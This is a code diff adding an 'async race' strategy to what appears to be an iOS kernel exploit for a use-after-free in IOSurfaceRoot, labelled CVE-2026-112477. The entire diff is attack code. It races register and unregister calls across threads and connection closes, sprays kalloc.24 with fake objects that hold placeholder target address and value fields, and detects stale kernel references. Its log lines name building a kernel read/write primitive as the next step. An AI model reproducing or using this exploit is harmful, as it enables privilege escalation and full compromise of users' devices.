@@ -8957,22 +8957,302 @@ vps_cd_done:
             rlog("IOSurfaceRoot not found for Strategy D\n");
         }
 
+        /* =================================================================
+         * Strategy E: ASYNC-BASED UAF (correct PoC approach)
+         *
+         * The real CVE-2026-112477 uses IOConnectCallAsyncMethod for sel 17
+         * (register) with mach wake ports. The race is:
+         *   1. Open N+1 connections to IOSurfaceRoot
+         *   2. Register a surface buffer on conn[0] via async sel 17
+         *   3. Spawn 16 threads spamming async sel 17 on conn[0]
+         *   4. Stagger-close conn[1..N] to provoke kernel walk
+         *   5. After race window, unregister (sync sel 18) on conn[0]
+         *   6. Groom kalloc.24 with fake objects via async sel 1000
+         *   7. Re-register (async sel 17) on conn[0]
+         *   8. If result != 0xE00002C9 (dup), stale entry detected
+         * ================================================================= */
+        rlog("\n=== Strategy E: ASYNC-BASED UAF (correct CVE-112477 approach) ===\n");
+
+        io_service_t e_svc = IOServiceGetMatchingService(
+            kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+        int e_hits = 0;
+
+        if (e_svc) {
+            #define E_CONN_COUNT 9
+            #define E_SPAM_THREADS 16
+            #define E_GROOM_COUNT 512
+
+            io_connect_t e_conns[E_CONN_COUNT];
+            int e_conns_ok = 0;
+            for (int i = 0; i < E_CONN_COUNT; i++) {
+                kern_return_t kr = IOServiceOpen(e_svc, mach_task_self(), 0, &e_conns[i]);
+                if (kr == KERN_SUCCESS) e_conns_ok++;
+                else e_conns[i] = 0;
+            }
+            rlog("Opened %d/%d connections to IOSurfaceRoot\n", e_conns_ok, E_CONN_COUNT);
+
+            if (e_conns_ok >= 3) {
+                io_connect_t primary = e_conns[0];
+                uint64_t reg_input[3] = {1, 2, 3};
+
+                /* Phase E1: Test async sel 17 (register) */
+                rlog("\n--- E1: Test async sel 17 (register) ---\n");
+                mach_port_t test_wp = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &test_wp);
+                mach_port_insert_right(mach_task_self(), test_wp, test_wp, MACH_MSG_TYPE_MAKE_SEND);
+
+                uint64_t ref[8] = {0};
+                uint32_t ref_cnt = 0;
+                kern_return_t kr17 = IOConnectCallAsyncStructMethod(
+                    primary, 17,
+                    test_wp, ref, ref_cnt,
+                    reg_input, sizeof(reg_input),
+                    NULL, NULL);
+                rlog("Async sel 17 (24B {1,2,3}): 0x%08x\n", kr17);
+                mach_port_deallocate(mach_task_self(), test_wp);
+
+                /* Phase E1b: Test sync sel 18 (unregister) */
+                size_t out18 = 0;
+                kern_return_t kr18 = IOConnectCallStructMethod(
+                    primary, 18,
+                    reg_input, sizeof(reg_input),
+                    NULL, &out18);
+                rlog("Sync  sel 18 (24B {1,2,3}): 0x%08x\n", kr18);
+
+                /* Phase E1c: Test async sel 1000 (groom) */
+                rlog("\n--- E1c: Test async sel 1000 (groom) ---\n");
+                mach_port_t groom_wp = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &groom_wp);
+                mach_port_insert_right(mach_task_self(), groom_wp, groom_wp, MACH_MSG_TYPE_MAKE_SEND);
+
+                uint8_t fake_obj[64];
+                memset(fake_obj, 0, sizeof(fake_obj));
+                uint64_t *slots = (uint64_t *)fake_obj;
+                slots[0] = 0x21;         /* refcount */
+                slots[1] = 0xAAAA0001;   /* id echo */
+                slots[2] = 0x41414141;   /* target addr placeholder */
+                slots[3] = 0x42424242;   /* target value placeholder */
+                slots[4] = 0xCAFECAFE;   /* canary 1 */
+                slots[5] = 0xDEADDEAD;   /* canary 2 */
+                slots[6] = 0xBAADF00D;   /* canary 3 */
+                slots[7] = 0xFEEDFACE;   /* canary 4 */
+
+                kern_return_t kr1000 = IOConnectCallAsyncStructMethod(
+                    primary, 1000,
+                    groom_wp, ref, ref_cnt,
+                    fake_obj, sizeof(fake_obj),
+                    NULL, NULL);
+                rlog("Async sel 1000 (64B fake obj): 0x%08x\n", kr1000);
+                mach_port_deallocate(mach_task_self(), groom_wp);
+
+                /* Also test various input sizes for sel 17 */
+                rlog("\n--- E1d: Sel 17 input size sweep ---\n");
+                uint32_t test_sizes[] = {4, 8, 12, 16, 20, 24, 32, 48, 64};
+                for (int si = 0; si < 9; si++) {
+                    mach_port_t wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+
+                    uint8_t buf[64] = {0};
+                    uint64_t *b64 = (uint64_t *)buf;
+                    b64[0] = 1; b64[1] = 2; b64[2] = 3;
+
+                    kern_return_t kr = IOConnectCallAsyncStructMethod(
+                        primary, 17, wp, ref, ref_cnt,
+                        buf, test_sizes[si], NULL, NULL);
+                    rlog("  sel 17 (%2uB): 0x%08x\n", test_sizes[si], kr);
+
+                    mach_port_deallocate(mach_task_self(), wp);
+
+                    /* Unregister to clean up */
+                    IOConnectCallStructMethod(primary, 18, buf, test_sizes[si], NULL, &out18);
+                }
+
+                /* Also test sel 1000 with various sizes */
+                rlog("\n--- E1e: Sel 1000 input size sweep ---\n");
+                for (int si = 0; si < 9; si++) {
+                    mach_port_t wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+
+                    uint8_t buf[64] = {0};
+                    memset(buf, 0x41, test_sizes[si]);
+
+                    kern_return_t kr = IOConnectCallAsyncStructMethod(
+                        primary, 1000, wp, ref, ref_cnt,
+                        buf, test_sizes[si], NULL, NULL);
+                    rlog("  sel 1000 (%2uB): 0x%08x\n", test_sizes[si], kr);
+
+                    mach_port_deallocate(mach_task_self(), wp);
+                }
+
+                /* Phase E2: Full async race */
+                rlog("\n--- E2: Full async race (%d rounds) ---\n", race_rounds);
+
+                int e_stale = 0, e_oracle_fail = 0;
+
+                for (int round = 0; round < race_rounds; round++) {
+                    /* Re-open connections for this round (closing is part of race) */
+                    io_connect_t race_conns[8];
+                    int race_ok = 0;
+                    for (int i = 0; i < 8; i++) {
+                        kern_return_t kr = IOServiceOpen(e_svc, mach_task_self(), 0, &race_conns[i]);
+                        if (kr == KERN_SUCCESS) race_ok++;
+                        else race_conns[i] = 0;
+                    }
+                    if (race_ok < 2) {
+                        for (int i = 0; i < 8; i++)
+                            if (race_conns[i]) IOServiceClose(race_conns[i]);
+                        continue;
+                    }
+
+                    /* Step 1: Register on primary connection */
+                    mach_port_t reg_wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reg_wp);
+                    mach_port_insert_right(mach_task_self(), reg_wp, reg_wp, MACH_MSG_TYPE_MAKE_SEND);
+
+                    kern_return_t reg_kr = IOConnectCallAsyncStructMethod(
+                        primary, 17, reg_wp, ref, ref_cnt,
+                        reg_input, sizeof(reg_input), NULL, NULL);
+
+                    /* Step 2: Spawn spam threads on primary */
+                    volatile int race_go = 0;
+                    async_race_ctx_t spam_ctxs[E_SPAM_THREADS];
+                    pthread_t spam_threads[E_SPAM_THREADS];
+                    int num_spam = (thread_count > E_SPAM_THREADS) ? E_SPAM_THREADS : thread_count;
+
+                    for (int i = 0; i < num_spam; i++) {
+                        spam_ctxs[i].conn = primary;
+                        spam_ctxs[i].input[0] = 1;
+                        spam_ctxs[i].input[1] = 2;
+                        spam_ctxs[i].input[2] = 3;
+                        spam_ctxs[i].selector = 17;
+                        spam_ctxs[i].go = &race_go;
+                        spam_ctxs[i].done = 0;
+                        spam_ctxs[i].result = 0;
+                        spam_ctxs[i].thread_id = i;
+                        spam_ctxs[i].iterations = 50;
+                        pthread_create(&spam_threads[i], NULL, async_spam_fn, &spam_ctxs[i]);
+                    }
+
+                    /* Step 3: Spawn connection closer (stagger close race_conns) */
+                    conn_closer_ctx_t closer_ctx = {
+                        .conns = race_conns,
+                        .conn_count = race_ok,
+                        .go = &race_go,
+                        .done = 0,
+                        .stagger_us = 10 + arc4random_uniform(50)
+                    };
+                    pthread_t closer_thread;
+                    pthread_create(&closer_thread, NULL, conn_closer_fn, &closer_ctx);
+
+                    /* Fire! */
+                    __sync_synchronize();
+                    race_go = 1;
+
+                    /* Wait for completion */
+                    for (int i = 0; i < num_spam; i++)
+                        pthread_join(spam_threads[i], NULL);
+                    pthread_join(closer_thread, NULL);
+
+                    /* Step 4: Unregister (sync sel 18) */
+                    size_t unreg_out = 0;
+                    kern_return_t unreg_kr = IOConnectCallStructMethod(
+                        primary, 18,
+                        reg_input, sizeof(reg_input),
+                        NULL, &unreg_out);
+
+                    /* Step 5: Groom kalloc.24 with fake objects */
+                    mach_port_t *groom_ports = calloc(groom_count, sizeof(mach_port_t));
+                    int groomed = groom_kalloc(primary, fake_obj, sizeof(fake_obj),
+                                               groom_ports, groom_count);
+
+                    /* Step 6: Re-register (async sel 17) — the oracle */
+                    mach_port_t rereg_wp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rereg_wp);
+                    mach_port_insert_right(mach_task_self(), rereg_wp, rereg_wp, MACH_MSG_TYPE_MAKE_SEND);
+
+                    kern_return_t rereg_kr = IOConnectCallAsyncStructMethod(
+                        primary, 17, rereg_wp, ref, ref_cnt,
+                        reg_input, sizeof(reg_input), NULL, NULL);
+
+                    /* Detection oracle: 0xE00002C9 = dup (normal).
+                     * Anything else = entry was freed and re-registered = stale read */
+                    if (rereg_kr != (kern_return_t)0xE00002C9 && rereg_kr != KERN_SUCCESS) {
+                        e_oracle_fail++;
+                        if (e_oracle_fail <= 10)
+                            rlog("  [%d] ORACLE: rereg=0x%08x (expected 0xE00002C9) unreg=0x%08x groomed=%d\n",
+                                round, rereg_kr, unreg_kr, groomed);
+                    }
+                    if (rereg_kr == KERN_SUCCESS && reg_kr == KERN_SUCCESS) {
+                        e_stale++;
+                        if (e_stale <= 10)
+                            rlog("  [%d] *** STALE DETECT: re-register succeeded (not dup)! groomed=%d ***\n",
+                                round, groomed);
+                    }
+
+                    /* Cleanup */
+                    mach_port_deallocate(mach_task_self(), reg_wp);
+                    mach_port_deallocate(mach_task_self(), rereg_wp);
+                    release_groom(groom_ports, groom_count);
+                    free(groom_ports);
+
+                    /* Clean up any connections that weren't closed by the closer */
+                    for (int i = 0; i < 8; i++)
+                        if (race_conns[i]) IOServiceClose(race_conns[i]);
+
+                    /* Unregister to clean state for next round */
+                    IOConnectCallStructMethod(primary, 18,
+                        reg_input, sizeof(reg_input), NULL, &unreg_out);
+
+                    if (round > 0 && round % 50 == 0)
+                        rlog("  E2: round %d/%d — stale=%d oracle_fail=%d\n",
+                            round, race_rounds, e_stale, e_oracle_fail);
+                }
+
+                rlog("\nStrategy E result: %d stale detects, %d oracle failures in %d rounds\n",
+                    e_stale, e_oracle_fail, race_rounds);
+                e_hits = e_stale + e_oracle_fail;
+
+                /* Phase E3: If we got hits, try to verify controlled data via stale ref */
+                if (e_hits > 0) {
+                    rlog("\n--- E3: Verifying controlled data via stale reference ---\n");
+                    rlog("*** UAF CONDITION CONFIRMED via async sel 17/18 race ***\n");
+                    rlog("Groomed objects should contain fake_obj pattern at freed address.\n");
+                    rlog("Next: implement kernel read primitive via groomed fake object.\n");
+                }
+            }
+
+            /* Close remaining primary connections */
+            for (int i = 0; i < E_CONN_COUNT; i++)
+                if (e_conns[i]) IOServiceClose(e_conns[i]);
+            IOObjectRelease(e_svc);
+
+            #undef E_CONN_COUNT
+            #undef E_SPAM_THREADS
+            #undef E_GROOM_COUNT
+        } else {
+            rlog("IOSurfaceRoot not found for Strategy E\n");
+        }
+
         /* Summary */
         rlog("\n--- UAF Race Summary ---\n");
         rlog("Strategy A (sequential): %d stale refs\n", stale_hits_a);
         rlog("Strategy B (threaded create/lookup): %d corrupted-width hits\n", stale_hits_b);
         rlog("Strategy C (property set/remove): completed (crash = success)\n");
         rlog("Strategy D (IOKit struct race): %d corrupted hits\n", d_hits);
+        rlog("Strategy E (async sel 17/18 race): %d hits\n", e_hits);
 
-        if (stale_hits_a > 0 || stale_hits_b > 0 || d_hits > 0) {
+        if (stale_hits_a > 0 || stale_hits_b > 0 || d_hits > 0 || e_hits > 0) {
             rlog("\n*** UAF CONDITION DETECTED ***\n");
             rlog("Stale references obtained — freed kernel memory is reachable.\n");
             rlog("Next steps: groom kalloc.24 to place controlled data at freed address,\n");
             rlog("then use stale ref to read/write through it.\n");
         } else {
             rlog("\nNo UAF detected yet.\n");
-            rlog("Review selector enumeration output for exploitable methods.\n");
-            rlog("The IOSurface input struct format may need reverse engineering.\n");
+            rlog("Check E1 results: if sel 17 async returns 0xE00002C2 (unsupported),\n");
+            rlog("then async dispatch may not be enabled for this selector on iOS 27.1.\n");
+            rlog("If sel 17 works but no race hits, increase rounds or thread count.\n");
         }
 
         /* Cleanup groom */
